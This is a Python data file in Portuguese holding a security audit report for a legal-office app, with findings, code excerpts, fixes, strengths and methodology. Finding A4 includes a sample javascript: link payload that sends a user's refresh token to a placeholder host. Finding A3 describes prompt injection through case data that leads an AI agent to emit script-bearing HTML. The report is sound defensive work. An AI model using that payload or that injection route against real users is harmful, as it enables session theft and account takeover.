"""Dados da auditoria de segurança do Rito — fonte única do relatório.

Separado do gerador de propósito: revisar um achado (severidade, texto, evidência) não
deveria exigir ler código de layout, e regerar o PDF depois de corrigir uma falha é
editar esta lista e rodar `gerar_relatorio.py` de novo.

Cada achado é verificado no código real — arquivo e linha conferidos na data da
auditoria (08/09/2026, commit dc0965d).
"""

from dataclasses import dataclass, field

PROJETO = "Rito (advbox-clone)"
DATA = "8 de setembro de 2026"
COMMIT = "dc0965d"

# Paleta pedida no escopo da auditoria.
CORES = {
    "crítica": "#B91C1C",
    "alta": "#EA580C",
    "média": "#D97706",
    "baixa": "#2563EB",
    "informativa": "#64748B",
    "forte": "#059669",
}

CATEGORIAS = {
    "C1": "1. Banco sem tranca (isolamento)",
    "C2": "2. Permissão definida no navegador",
    "C3": "3. IDOR",
    "C4": "4. Chaves expostas",
    "C5": "5. Inputs sem tratamento (XSS)",
    "C6": "Outros (fora das 5 categorias)",
}


@dataclass(frozen=True)
class Achado:
    id: str
    titulo: str
    severidade: str
    categoria: str
    arquivos: list[str]
    descricao: str
    trecho: str
    explorabilidade: str
    impacto: str
    correcao: str
    aceite: list[str]
    condicoes: str = ""
    issue: bool = True


ACHADOS: list[Achado] = [
    Achado(
        id="A1",
        titulo="API pública lista tarefas privadas de todos os usuários",
        severidade="alta",
        categoria="C1",
        arquivos=[
            "backend/app/public/router.py:527-549",
            "backend/app/domain/posts/listing.py:154-172",
            "backend/app/domain/posts/service.py:40-50",
        ],
        descricao=(
            "O isolamento por DONO dentro de um mesmo escritório é feito pelo predicado "
            "`visible_to(viewer_id)` (posts/listing.py:154), que a spec 033 descreve como "
            "«tarefa privada só existe para o criador e os responsáveis — nem o GESTOR a vê». "
            "Ele é aplicado em exatamente um lugar do código (listing.py:232), consumido pela "
            "API interna. A rota equivalente da API pública monta o `select(Post)` à mão e não "
            "aplica predicado nenhum de visibilidade: devolve toda tarefa do tenant, inclusive "
            "as marcadas `is_private=True`, com o campo `comments` (o conteúdo da tarefa) no "
            "corpo da resposta (`PublicPost.comments`, public/schemas.py:131)."
        ),
        trecho=(
            "# backend/app/public/router.py:535\n"
            "stmt = select(Post).order_by(Post.created_at.desc(), Post.id.desc()).limit(limit)\n"
            "# ← falta: .where(visible_to(<usuário>))\n\n"
            "# backend/app/domain/posts/listing.py:159 (a regra que existe e não é usada aqui)\n"
            'def visible_to(viewer_id): """tarefa privada só existe para o criador e os\n'
            '    responsáveis — nem o GESTOR a vê"""'
        ),
        explorabilidade=(
            "Basta um token de API com o escopo `read:posts` e um GET em "
            "`/api/public/v1/posts`. Nenhum parâmetro especial: a resposta padrão já traz as "
            "tarefas privadas misturadas às demais. O token é de escritório, então quem o "
            "detém — inclusive um integrador terceiro — lê conteúdo que a própria UI esconde "
            "do Gestor do escritório."
        ),
        impacto=(
            "Vazamento de conteúdo confidencial entre colegas e para fora do escritório: "
            "anotação privada sobre um caso, sobre um cliente ou sobre um colega. Quebra uma "
            "garantia explícita do produto, não uma suposição."
        ),
        correcao=(
            "Aplicar `visible_to()` no `select(Post)` da rota pública, tomando como "
            "`viewer_id` o `caller.acting_user_id` (o usuário dono do token, que o módulo já "
            "resolve em `_acting_user`). Alternativa mais restritiva e defensável: excluir "
            "toda tarefa privada da API pública (`Post.is_private.is_(False)`), que é o que a "
            "busca global já faz em search/service.py:137."
        ),
        aceite=[
            "`GET /api/public/v1/posts` não devolve nenhuma tarefa com `is_private=True` que "
            "não pertença ao usuário dono do token",
            "Teste de integração cria uma tarefa privada de outro usuário e afirma que ela "
            "não aparece na listagem pública, nem no `total`, nem via `?lawsuit_id=`",
            "O mesmo predicado `visible_to` é a única fonte da regra (sem cópia da condição)",
        ],
        condicoes="Requer um token de API válido com escopo `read:posts` (spec 095).",
    ),
    Achado(
        id="A2",
        titulo="Token de API ignora a dimensão de acesso financeiro do RBAC",
        severidade="alta",
        categoria="C2",
        arquivos=[
            "backend/app/public/router.py:622-684",
            "backend/app/domain/api_tokens/router.py:73-92",
            "backend/app/domain/api_tokens/scopes.py:13-25",
            "backend/app/core/permissions.py:79-88",
        ],
        descricao=(
            "O RBAC do sistema tem duas dimensões ortogonais (spec 005): perfil "
            "(Gestor/Administrador/Colaborador) e acesso financeiro (Sem acesso / Somente "
            "visualizador / Acesso completo). Toda rota financeira interna declara "
            "`require_financial(...)`, e o frontend esconde a aba correspondente. A API "
            "pública replica só a primeira dimensão: as rotas de `/transactions` são "
            "protegidas apenas por escopo de token (`read:transactions` / "
            "`write:transactions`), sem nenhuma checagem de `financial_access` — nem no "
            "router, nem no `TransactionService` (que não conhece `FinancialAccess`). "
            "E a criação de token exige `require_role(GESTOR)` sem exigir acesso financeiro."
        ),
        trecho=(
            "# backend/app/public/router.py:626 — único guarda da rota\n"
            'caller: ApiCaller = Depends(require_scope("read:transactions")),\n\n'
            "# backend/app/domain/api_tokens/router.py:76 — quem emite o token\n"
            "current_user: User = Depends(require_role(UserRole.GESTOR)),\n"
            "# ← sem require_financial: um GESTOR com financial_access=NONE emite\n"
            "#   um token com escopo financeiro para si mesmo"
        ),
        explorabilidade=(
            "Um Gestor com `financial_access=NONE` — que recebe 403 em toda rota financeira "
            "da UI — cria um token em `POST /api/v1/api-tokens` com os escopos "
            "`read:transactions` e `write:transactions` e passa a ler, criar e alterar "
            "lançamentos por `/api/public/v1/transactions`. É uma escalada de privilégio de "
            "um passo, feita pelas próprias telas do produto."
        ),
        impacto=(
            "Toda a dimensão de acesso financeiro vira decorativa para quem é Gestor: "
            "faturamento, honorários, contas a pagar e a receber ficam legíveis e editáveis "
            "por quem o escritório decidiu deixar de fora do financeiro."
        ),
        correcao=(
            "Duas correções complementares: (a) gravar no token as capacidades do emissor e "
            "conferir `financial_access >= READ_ONLY` (leitura) e `FULL` (escrita) nas rotas "
            "financeiras públicas, do mesmo modo que `require_financial` faz na interna; "
            "(b) recusar a emissão de token com escopo financeiro quando o emissor não tem o "
            "acesso correspondente — um token nunca deve poder mais do que quem o criou."
        ),
        aceite=[
            "Um Gestor com `financial_access=NONE` recebe 4xx ao criar token com escopo "
            "`read:transactions`/`write:transactions`",
            "Um token cujo emissor perdeu o acesso financeiro recebe 403 nas rotas "
            "`/api/public/v1/transactions*`",
            "Teste de integração cobre os três níveis (NONE / READ_ONLY / FULL) na API "
            "pública, espelhando `test_financial_permission_sweep.py`",
        ],
        condicoes="Requer perfil GESTOR (quem pode emitir token). Nenhuma configuração especial.",
    ),
    Achado(
        id="A3",
        titulo="HTML gerado por LLM renderizado sem sanitização (XSS armazenado)",
        severidade="alta",
        categoria="C5",
        arquivos=[
            "frontend/src/features/legal-agents/GeneratedBriefPreview.tsx:55",
            "backend/app/domain/legal_agents/service.py:147-155",
            "backend/src (nenhuma lib de sanitização no projeto)",
        ],
        descricao=(
            "A minuta gerada pelos agentes jurídicos é guardada como HTML cru vindo do modelo "
            "(`content={'format': 'html', 'html': html}`) e injetada no DOM com "
            "`dangerouslySetInnerHTML`. O único tratamento aplicado entre a geração e a tela é "
            "`strip_unsupported_citations`, que substitui números de súmula/recurso sem "
            "respaldo — não é sanitização de HTML e não remove `<script>`, `onerror`, "
            "`<iframe>` ou `href=\"javascript:\"`. O projeto não tem DOMPurify, sanitize-html "
            "nem equivalente (conferido em frontend/package.json e backend/pyproject.toml)."
        ),
        trecho=(
            "# frontend/src/features/legal-agents/GeneratedBriefPreview.tsx:55\n"
            "dangerouslySetInnerHTML={{ __html: generation.content.html }}\n\n"
            "# backend/app/domain/legal_agents/service.py:147\n"
            "html, removidas = strip_unsupported_citations(response.content or '', contexto)\n"
            "#   ^ resposta do modelo, sem escape nem allowlist de tags"
        ),
        explorabilidade=(
            "O prompt do agente é montado a partir de dados do processo (partes, andamentos, "
            "intimações importadas do DJEN, documentos com OCR) e das `instructions` digitadas "
            "pelo usuário. Texto atacante-controlado em qualquer uma dessas fontes pode "
            "induzir o modelo a emitir markup executável (injeção de prompt), e nada entre o "
            "modelo e o `innerHTML` o remove. Mesmo sem atacante, um modelo pode emitir "
            "markup por conta própria. O refresh token fica em `localStorage` "
            "(frontend/src/lib/api.ts:40), então o script executado consegue exfiltrá-lo e "
            "manter sessão por até 30 dias."
        ),
        impacto=(
            "Execução de script na origem da aplicação, com o usuário autenticado: roubo do "
            "refresh token (sequestro de conta), leitura de qualquer dado que o usuário "
            "enxerga e ações escritas em nome dele."
        ),
        correcao=(
            "Sanitizar antes de renderizar, com allowlist de tags e atributos (DOMPurify no "
            "cliente e/ou nleach/bleach-equivalente no servidor, aplicado na gravação). "
            "Sanitizar no servidor é preferível: o mesmo HTML alimenta o editor, o PDF "
            "(templates/pdf.py) e o template salvo. Se as duas pontas forem sanitizadas, "
            "documentar qual é a fonte da verdade."
        ),
        aceite=[
            "Uma geração cujo HTML contém `<script>`, `onerror=` ou `href=\"javascript:\"` "
            "chega à tela sem esses elementos/atributos",
            "Existe uma lib de sanitização declarada em package.json (ou pyproject.toml) e um "
            "único ponto do código que a aplica",
            "Teste automatizado com payload de XSS cobre a pré-visualização, o editor e o PDF",
        ],
        condicoes=(
            "Requer a camada de IA ativa (OPENROUTER_API_KEY configurada) e o agente "
            "jurídico habilitado — em instalação sem IA a tela não é alcançável."
        ),
    ),
    Achado(
        id="A4",
        titulo="URL de terceiro renderizada em href sem validação de esquema",
        severidade="média",
        categoria="C5",
        arquivos=[
            "frontend/src/features/publications/PublicationDetailDrawer.tsx:129",
            "backend/app/integrations/djen/parser.py:188",
            "backend/app/domain/publications/schemas.py:28-33",
            "backend/app/domain/publications/router.py:146-149",
        ],
        descricao=(
            "O campo `link` da intimação é copiado verbatim do item bruto "
            "(`'link': _to_str(item.get('link'))`) e renderizado como `href` de uma âncora. "
            "O item bruto não vem só do DJEN: `POST /api/v1/publications` aceita "
            "`item: dict[str, Any]` de qualquer COLABORADOR, sem validar o esquema da URL em "
            "nenhuma das duas pontas. React 18 renderiza `javascript:` em `href` (apenas "
            "avisa no console; o bloqueio duro só chegou no React 19)."
        ),
        trecho=(
            "# frontend/src/features/publications/PublicationDetailDrawer.tsx:129\n"
            '<a href={publication.link} target="_blank" rel="noreferrer">\n\n'
            "# backend/app/domain/publications/schemas.py:33\n"
            "item: dict[str, Any] = Field()   # payload arbitrário, sem validação de link"
        ),
        explorabilidade=(
            "Um colaborador (ou um token com escrita) registra uma intimação com "
            '`link: "javascript:fetch(\'https://x/?c=\'+localStorage.refresh_token)"`. '
            "Qualquer colega que abrir a gaveta da intimação e clicar em «Abrir no site do "
            "tribunal» executa o script. Exige interação da vítima — daí a severidade menor "
            "que A3."
        ),
        impacto=(
            "XSS armazenado com um clique: mesmo alcance de A3 (refresh token em "
            "`localStorage`, ações em nome da vítima), com a barreira do clique."
        ),
        correcao=(
            "Validar o esquema na entrada (aceitar apenas `http`/`https` ao gravar a "
            "publicação) e, por segurança em profundidade, sanear na renderização com um "
            "helper `safeHref()` compartilhado — o mesmo tratamento vale para "
            "`whatsapp_link` e para qualquer URL que venha de dado."
        ),
        aceite=[
            "Publicação importada com `link` em esquema diferente de http/https é rejeitada "
            "ou tem o link descartado",
            "O componente não renderiza âncora quando a URL não passa na validação",
            "Teste unitário do helper cobre `javascript:`, `data:` e `vbscript:`",
        ],
    ),
    Achado(
        id="A5",
        titulo="/metrics sem autenticação por padrão em produção",
        severidade="média",
        categoria="C6",
        arquivos=[
            "backend/app/core/health.py:74-88",
            ".env.production.example:42",
            "docker-compose.prod.yml (api: portas publicadas)",
        ],
        descricao=(
            "O endpoint `/metrics` só exige bearer quando `METRICS_TOKEN` está configurado; "
            "sem token ele responde a qualquer requisição. O arquivo de exemplo de produção "
            "entrega `METRICS_TOKEN=` vazio, e o compose de produção publica a porta da API "
            "no host — de modo que a instalação padrão sobe com o endpoint aberto. "
            "A validação de boot (`bootstrap.py`) não lista `metrics_token` entre as "
            "obrigatórias em produção. Detalhe adicional: a comparação do token usa `!=` "
            "(health.py:87), não `hmac.compare_digest` — o próprio projeto documenta a "
            "diferença em webhooks/signature.py:38."
        ),
        trecho=(
            "# backend/app/core/health.py:86\n"
            "esperado = settings.metrics_token\n"
            "if esperado and authorization != f'Bearer {esperado}':\n"
            "    raise HTTPException(status_code=401, ...)\n"
            "# ← sem METRICS_TOKEN, nenhuma checagem acontece"
        ),
        explorabilidade=(
            "Um GET em `/metrics` de qualquer origem que alcance a API. O comentário no código "
            "assume «isolamento de rede de quem opera», premissa que o compose de produção "
            "publicado no repositório não cumpre."
        ),
        impacto=(
            "Exposição de inventário operacional: volume de requisições por rota, custo e "
            "tokens de LLM, profundidade das filas, taxa de erro. Não há dado de cliente, mas "
            "há mapa do sistema e sinal de carga útil para quem prepara um ataque."
        ),
        correcao=(
            "Exigir `METRICS_TOKEN` em produção pela mesma lista do `bootstrap.py` (ou "
            "recusar a exposição da rota sem ele) e comparar com `hmac.compare_digest`."
        ),
        aceite=[
            "Subir com `APP_ENV=production` e `METRICS_TOKEN` vazio falha no boot, ou "
            "`/metrics` responde 401 nesse cenário",
            "A comparação do token usa `hmac.compare_digest`",
            "`.env.production.example` deixa de sugerir o valor vazio como aceitável",
        ],
        condicoes="Explorável apenas se a API for alcançável de fora da rede de operação.",
    ),
    Achado(
        id="A6",
        titulo="CORS com `*` não é recusado no boot, e as credenciais são permitidas",
        severidade="baixa",
        categoria="C6",
        arquivos=["backend/app/main.py:267-273", "backend/app/core/bootstrap.py:110-119"],
        descricao=(
            "O `CORSMiddleware` é montado com `allow_credentials=True` e a lista de origens "
            "vinda de `CORS_ALLOWED_ORIGINS`. A validação de boot só recusa `localhost` em "
            "produção; um `*` (ou uma origem coringa mal escrita) passa. Com curinga e "
            "credenciais ligadas, o Starlette reflete a origem do requisitante no "
            "`Access-Control-Allow-Origin`, o que na prática autoriza qualquer site."
        ),
        trecho=(
            "# backend/app/main.py:269\n"
            "allow_origins=[o.strip() for o in settings.cors_allowed_origins.split(',')],\n"
            "allow_credentials=True,\n\n"
            "# backend/app/core/bootstrap.py:111 — a única checagem que existe\n"
            "if 'localhost' not in settings.cors_allowed_origins: return []"
        ),
        explorabilidade=(
            "Requer configuração insegura deliberada (`CORS_ALLOWED_ORIGINS=*`). Não é o "
            "padrão do projeto — é a ausência da rede de proteção que o resto do "
            "`bootstrap.py` estabelece para os demais parâmetros."
        ),
        impacto=(
            "Com essa configuração, qualquer página conseguiria fazer requisições "
            "autenticadas à API a partir do navegador da vítima."
        ),
        correcao=(
            "Acrescentar `*` (e origem vazia) à lista de problemas de "
            "`_cors_problems` em produção, na mesma linha da regra de `localhost`."
        ),
        aceite=[
            "`APP_ENV=production` com `CORS_ALLOWED_ORIGINS=*` recusa subir, com mensagem "
            "explicando o motivo",
            "Teste em `test_deploy.py`/`test_bootstrap` cobre o caso",
        ],
        condicoes="Só se manifesta com CORS_ALLOWED_ORIGINS configurado com curinga.",
    ),
    Achado(
        id="A7",
        titulo="Validação anti-SSRF do webhook é vulnerável a DNS rebinding (TOCTOU)",
        severidade="baixa",
        categoria="C6",
        arquivos=[
            "backend/app/domain/webhooks/ssrf.py:83-98",
            "backend/app/domain/webhooks/sender.py:88",
        ],
        descricao=(
            "A peneira de SSRF é sólida — resolve o host, rejeita privado/loopback/link-local/"
            "metadados de nuvem e revalida cada redirecionamento. Resta a janela clássica "
            "entre validar e conectar: `validate_webhook_url` faz um `getaddrinfo`, e o "
            "`httpx` faz outro ao abrir a conexão. Um DNS com TTL baixo pode responder um IP "
            "público na primeira consulta e um IP interno na segunda."
        ),
        trecho=(
            "# backend/app/domain/webhooks/ssrf.py:86\n"
            "infos = socket.getaddrinfo(host, None, proto=socket.IPPROTO_TCP)\n"
            "# ...validação...\n"
            "# backend/app/domain/webhooks/sender.py:88 — segunda resolução, não amarrada\n"
            "response = await client.post(destino, content=body, headers=headers)"
        ),
        explorabilidade=(
            "Exige perfil GESTOR (quem cadastra webhook) e um servidor DNS sob controle do "
            "atacante. É um ataque de operador malicioso ou de conta comprometida, não de "
            "usuário anônimo."
        ),
        impacto=(
            "Entrega de um POST assinado a um endereço da rede interna; com sorte de "
            "endereçamento, alcance a serviços internos sem autenticação."
        ),
        correcao=(
            "Fixar o IP validado na conexão (resolver uma vez e conectar naquele IP, com o "
            "`Host` original) — por exemplo, com um transporte httpx que receba o endereço já "
            "resolvido — ou usar um resolvedor com cache compartilhado entre validação e "
            "conexão."
        ),
        aceite=[
            "A conexão do webhook usa o mesmo endereço IP que passou pela validação",
            "Teste simula um resolvedor que muda de resposta entre as duas chamadas e afirma "
            "que a entrega é bloqueada",
        ],
        condicoes="Requer perfil GESTOR e um domínio com DNS controlado pelo atacante.",
    ),
    Achado(
        id="A8",
        titulo="`public_url` devolve URL assinada de 7 dias para avatares e logos",
        severidade="baixa",
        categoria="C6",
        arquivos=["backend/app/integrations/storage/s3.py:9,80-81"],
        descricao=(
            "O bucket não é público (bom: `public_url` é, na verdade, uma URL assinada), mas a "
            "validade é de sete dias — contra cinco minutos usada em anexos e documentos. "
            "A URL viaja em respostas de API, cai em log de proxy, em histórico de navegador e "
            "em captura de tela, e continua válida por uma semana para quem a obtiver."
        ),
        trecho=(
            "# backend/app/integrations/storage/s3.py:9\n"
            "_PRESIGNED_URL_EXPIRY_SECONDS = 7 * 24 * 60 * 60\n"
            "def public_url(self, key): return self.signed_url(key, expires_in_seconds=...)"
        ),
        explorabilidade=(
            "Não é falha de controle de acesso: exige que a URL vaze por outro canal "
            "(log, print, encaminhamento)."
        ),
        impacto="Acesso prolongado a foto de usuário e logo do escritório — dado de baixa criticidade.",
        correcao=(
            "Reduzir a validade para a ordem de minutos/horas e renová-la a cada resposta, "
            "como já é feito para anexos e documentos."
        ),
        aceite=[
            "A validade das URLs de avatar/logo é da mesma ordem das de anexo",
            "A constante fica em um lugar só, com comentário justificando o prazo",
        ],
    ),
    Achado(
        id="A9",
        titulo="Chave pública do DataJud e credenciais de desenvolvimento em arquivos versionados",
        severidade="informativa",
        categoria="C4",
        arquivos=[
            ".env.example:62",
            "docker-compose.yml:6,34-35",
            "backend/tests/meta/test_datajud_key.py:12",
        ],
        descricao=(
            "Registrado como CONFERIDO E ACEITÁVEL, não como falha. `DATAJUD_API_KEY` é a "
            "chave publicada pelo próprio CNJ na wiki da API Pública — não é credencial "
            "pessoal, e o projeto mantém um teste meta (`test_datajud_key.py`) que impede "
            "que ela apareça hardcoded no código de produção. As credenciais do "
            "`docker-compose.yml` (`rito/rito`, `minioadmin/minioadmin`) são do ambiente de "
            "desenvolvimento local; o compose de produção é outro arquivo e exige toda senha "
            "por `${VAR:?}`. Nenhum segredo real foi encontrado no histórico do Git."
        ),
        trecho=(
            "# .env.example:62 — chave PÚBLICA do CNJ, documentada como tal\n"
            "DATAJUD_API_KEY=cDZHYzlZa0JadVREZDJCendQbXY6...\n\n"
            "# docker-compose.prod.yml — o contraste que faz esta linha ser aceitável\n"
            "POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:?defina POSTGRES_PASSWORD}"
        ),
        explorabilidade=(
            "Não explorável. Vale a observação de que o `docker-compose.yml` de "
            "desenvolvimento publica Postgres (5432), Redis (6379) e MinIO (9000) no host com "
            "senhas triviais — o que só importa em máquina de desenvolvedor exposta à rede."
        ),
        impacto="Nenhum, no arranjo atual.",
        correcao=(
            "Manter. Se quiser endurecer: ligar as portas de desenvolvimento a `127.0.0.1` "
            "no compose local (`127.0.0.1:5432:5432`)."
        ),
        aceite=[],
        issue=False,
    ),
    Achado(
        id="A10",
        titulo="Categoria 3 (IDOR) sem achados confirmados",
        severidade="informativa",
        categoria="C3",
        arquivos=["backend/app/domain/*/router.py (40 routers percorridos)"],
        descricao=(
            "Percorridos todos os handlers de rota do backend que recebem id por caminho, "
            "query ou corpo. Nenhum acesso direto a objeto sem verificação de posse foi "
            "confirmado. A defesa é em duas camadas: RLS forçado no banco resolve o "
            "cruzamento entre escritórios, e verificações explícitas de posse cobrem o "
            "recorte por usuário dentro do mesmo escritório (comentário, anexo, notificação, "
            "conversa de IA, ponto, gráfico de desempenho, usuário). O único furo de "
            "visibilidade por dono encontrado está em A1, e ele é de listagem, não de acesso "
            "por id."
        ),
        trecho=(
            "# exemplos verificados\n"
            "notifications/service.py:88   if notification.user_id != user_id: return None\n"
            "attachments/service.py:160    if attachment.uploaded_by != user.id and role not in ADMIN\n"
            "comments/service.py:177       if comment.author_id != actor.id: raise Forbidden\n"
            "users/router.py:50            _ensure_self_or_administrator(...)\n"
            "reports/router.py:253         «você só pode ver o próprio ponto»"
        ),
        explorabilidade="—",
        impacto="—",
        correcao="—",
        aceite=[],
        issue=False,
    ),
]


@dataclass(frozen=True)
class Forte:
    titulo: str
    evidencia: str


FORTES: list[Forte] = [
    Forte(
        "RLS forçado em todas as tabelas de domínio, com auditoria automatizada",
        "core/rls.py:14-23 escreve ENABLE + FORCE + política por `app.tenant_id` para toda "
        "tabela; tests/integration/test_isolation_matrix.py lê o `pg_class`/`pg_policies` e "
        "reprova tabela com `tenant_id` sem RLS forçado, política divergente do padrão ou "
        "exceção não documentada em docs/SEGURANCA-RLS.md. São 56 políticas, 52 idênticas ao "
        "padrão e 7 exceções, todas justificadas.",
    ),
    Forte(
        "A aplicação roda com role sem BYPASSRLS",
        "`.env.example:11-14` separa `rito_app` (runtime, sob RLS) do superusuário (só "
        "migration); `test_isolation_matrix.py::test_role_da_aplicacao_nao_ignora_rls` "
        "verifica isso contra o banco.",
    ),
    Forte(
        "Tenant vem do claim do JWT, nunca de header, nas rotas autenticadas",
        "auth/deps.py:21-35 e :93-105 — `get_session_for_current_user` seta "
        "`app.tenant_id` a partir de `current_user.tenant_id`. O `X-Tenant-Id` de "
        "core/deps.py:18 só serve às rotas pré-login (login, refresh, reset, aceite de "
        "convite), onde ainda não existe token.",
    ),
    Forte(
        "Nenhuma rota nasce sem declaração de permissão",
        "tests/integration/test_permission_coverage.py varre o app inteiro pelo grafo de "
        "dependências do FastAPI e reprova qualquer rota `/api/v1` (fora de `/auth` e do "
        "aceite de convite) sem `require_role`/`require_financial` — e há um teste que prova "
        "que o scanner ainda detecta o caso ruim.",
    ),
    Forte(
        "Fronteira entre escritórios parceiros implementada dentro do banco",
        "partnerships/sharing.py + migration 079: toda leitura e a única escrita "
        "cross-tenant passam por funções `SECURITY DEFINER` que repetem o guarda "
        "«existe compartilhamento ATIVO para `current_setting('app.tenant_id')`». Valor "
        "financeiro só sai com `can_view_financial` no próprio SQL. Nenhuma política de RLS "
        "foi afrouxada para isso funcionar.",
    ),
    Forte(
        "Regra de tarefa privada escrita como `WHERE`, não como filtro pós-consulta",
        "posts/listing.py:154-172 — `visible_to()` entra na query, de modo que `total`, "
        "`next_cursor` e exportação contam a mesma coisa que a página mostra. As ferramentas "
        "de IA recebem `viewer_id=ctx.user.id` (ai/tools/read_tasks.py:87).",
    ),
    Forte(
        "Text-to-SQL da IA com quatro guardrails independentes",
        "ai/sql_guard.py — allowlist de relações (só views agregadas), análise sobre a "
        "árvore sintática (não regex), exatamente um comando por pergunta, teto de linhas "
        "injetado; e a execução em savepoint com `transaction_read_only = on` e "
        "`statement_timeout` (ai/analytics.py:404-420). Colunas financeiras exigem "
        "`financial_access` do usuário que perguntou.",
    ),
    Forte(
        "SSRF em webhooks tratado na resolução de DNS e em cada redirecionamento",
        "webhooks/ssrf.py + sender.py:70-94 — `follow_redirects=False` de propósito, com "
        "cada `Location` passando pela mesma peneira; bloqueio de metadados de nuvem, "
        "privado, loopback, link-local e reservado. Assinatura HMAC conferida com "
        "`hmac.compare_digest` (signature.py:38).",
    ),
    Forte(
        "Validação de configuração no boot, com recusa explícita do segredo de exemplo",
        "core/bootstrap.py — em produção lista TODAS as variáveis faltantes de uma vez, "
        "recusa `SECRET_KEY` igual ao valor público do `.env.example`, recusa segredo com "
        "menos de 32 caracteres e recusa CORS apontando para localhost.",
    ),
    Forte(
        "Nenhum segredo real versionado; `.env` fora do Git e histórico limpo",
        "`.gitignore:2` exclui `.env`; `git ls-files` confirma que só os `.example` estão "
        "versionados; varredura do histórico completo não encontrou credencial real — só "
        "senhas de teste E2E, valores efêmeros de CI e a chave pública do CNJ.",
    ),
    Forte(
        "Autenticação com Argon2, política de senha e limite de tentativas",
        "core/security.py:11-45 (Argon2 parametrizado, política de 8+ com número, maiúscula, "
        "minúscula e especial); auth/router.py:33-55 responde 429 no excesso de tentativas e "
        "usa a mesma mensagem para e-mail inexistente e senha errada.",
    ),
    Forte(
        "Segredos de token e webhook guardados como hash, mostrados uma vez",
        "api_tokens/service.py:43-50 (SHA-256 sobre 32 bytes de entropia, com justificativa "
        "de por que não é Argon2) e webhooks/signature.py:21-23; a busca do token por hash "
        "usa função `SECURITY DEFINER` dedicada em vez de afrouxar política.",
    ),
    Forte(
        "Consultas montadas pelo query builder — sem concatenação de entrada em SQL",
        "As poucas strings de SQL que restam são identificadores fixos de `REFRESH "
        "MATERIALIZED VIEW`, validados contra o registro `MATERIALIZED_VIEWS` "
        "(core/materialized_view.py:105-107), e comandos de sessão (`SET LOCAL`, "
        "`SAVEPOINT`). `tests/meta/test_sql_em_string.py` mantém essa lista fechada.",
    ),
    Forte(
        "Um único ponto de renderização de HTML no frontend",
        "Varredura de `frontend/src` encontrou exatamente um "
        "`dangerouslySetInnerHTML` (o de A3), nenhum `innerHTML`, `eval`, `new Function`, "
        "`srcDoc` ou `iframe`. E-mails transacionais são texto puro "
        "(core/transactional_email.py), sem HTML montado com dado do usuário.",
    ),
]

RECOMENDACOES: list[tuple[str, str, str]] = [
    (
        "P1",
        "Fechar as duas lacunas da API pública (A1 e A2)",
        "São o mesmo defeito de fundo: a API pública reimplementa consultas em vez de "
        "reusar as regras da interna. Aplicar `visible_to()` na listagem de tarefas e a "
        "dimensão `financial_access` nas rotas de lançamentos; acrescentar ao "
        "`tests/meta/test_public_api_contract.py` uma verificação de que cada rota pública "
        "declara a mesma permissão da rota interna equivalente — assim a próxima rota "
        "pública não nasce com o mesmo furo.",
    ),
    (
        "P1",
        "Sanitizar todo HTML que chega à tela (A3)",
        "Adotar uma lib de sanitização com allowlist e aplicá-la na gravação da minuta, "
        "cobrindo os três consumidores do mesmo HTML: pré-visualização, editor e PDF. "
        "Enquanto isso não existir, considerar o refresh token em `localStorage` como "
        "exposto a qualquer falha de sanitização.",
    ),
    (
        "P2",
        "Validar esquema de URL vinda de dado (A4)",
        "Aceitar apenas http/https ao gravar a publicação e criar um `safeHref()` "
        "compartilhado no frontend, aplicado também a `whatsapp_link`.",
    ),
    (
        "P2",
        "Tornar `METRICS_TOKEN` obrigatório em produção (A5)",
        "Acrescentá-lo a `REQUIRED_IN_PRODUCTION` em `bootstrap.py` e trocar a comparação "
        "por `hmac.compare_digest`. O projeto já tem o padrão pronto — falta aplicá-lo aqui.",
    ),
    (
        "P3",
        "Endurecer configuração e transporte (A6, A7, A8)",
        "Recusar `*` em CORS no boot; amarrar a conexão do webhook ao IP validado; reduzir "
        "a validade das URLs de avatar/logo. Nenhum é explorável na configuração padrão — "
        "são as bordas que faltam para o conjunto ficar coerente com o resto do projeto.",
    ),
]

METODOLOGIA = (
    "A stack foi detectada antes da auditoria e cada categoria do escopo foi mapeada para o "
    "equivalente nesta stack.\n\n"
    "<b>Stack detectada.</b> Backend em Python 3.12 com FastAPI, SQLAlchemy 2.0 assíncrono, "
    "Alembic e PostgreSQL 16; fila e cache em Redis/Celery; validação com Pydantic v2. "
    "Frontend em React 18 + TypeScript com Vite, Tailwind, shadcn/ui e TanStack Query. "
    "Autenticação por JWT HS256 (access em memória, refresh em localStorage) com Argon2. "
    "Camada de IA via OpenRouter com LangGraph e tool calling. Deploy por Docker Compose "
    "(um arquivo de desenvolvimento, um de produção) e CI no GitHub Actions. "
    "Sem Supabase, sem Firebase, sem ORM de terceiros além do SQLAlchemy.\n\n"
    "<b>Categoria 1 — banco sem tranca.</b> O mecanismo de isolamento é Row Level Security "
    "no PostgreSQL, com `app.tenant_id` setado por transação e a aplicação rodando numa role "
    "sem BYPASSRLS; a aplicação nunca filtra tenant no WHERE. A auditoria conferiu as "
    "políticas no catálogo do banco (via os testes que as leem), as funções SECURITY DEFINER "
    "que são as exceções documentadas, e — dentro de um mesmo escritório — o segundo nível "
    "de isolamento, o de dono (tarefa privada, notificação, conversa de IA, ponto).\n\n"
    "<b>Categoria 2 — permissão definida no navegador.</b> Cada gate de papel do frontend "
    "(`user?.role === ...`, `capabilities`) foi cruzado com a rota correspondente do backend. "
    "O equivalente ao servidor é a dupla `require_role`/`require_financial`.\n\n"
    "<b>Categoria 3 — IDOR.</b> Percorridos todos os 40 routers do backend, handler por "
    "handler, incluindo a API pública por token.\n\n"
    "<b>Categoria 4 — chaves expostas.</b> Varredura do código, dos `.env.example`, dos "
    "arquivos de Compose, do workflow de CI, dos scripts, da documentação, do histórico "
    "completo do Git e das variáveis que entram no bundle do frontend.\n\n"
    "<b>Categoria 5 — inputs sem tratamento.</b> Busca por todos os sinks de HTML e URL do "
    "React (`dangerouslySetInnerHTML`, `innerHTML`, `eval`, `new Function`, `srcDoc`, `href` "
    "dinâmico) e, no backend, por HTML montado com dado do usuário (e-mail, template, PDF)."
)

ESCOPO = (
    "Código-fonte completo do repositório no commit dc0965d: 455 módulos Python em "
    "`backend/app` (40 routers de domínio, mais a API pública por token), 505 arquivos "
    "TypeScript/TSX em `frontend/src`, 88 migrations do Alembic, a suíte de testes "
    "(incluindo os testes meta de arquitetura e isolamento), os arquivos de deploy "
    "(`docker-compose.yml`, `docker-compose.prod.yml`, `.github/workflows/ci.yml`), os "
    "arquivos de exemplo de ambiente e o histórico do Git."
)
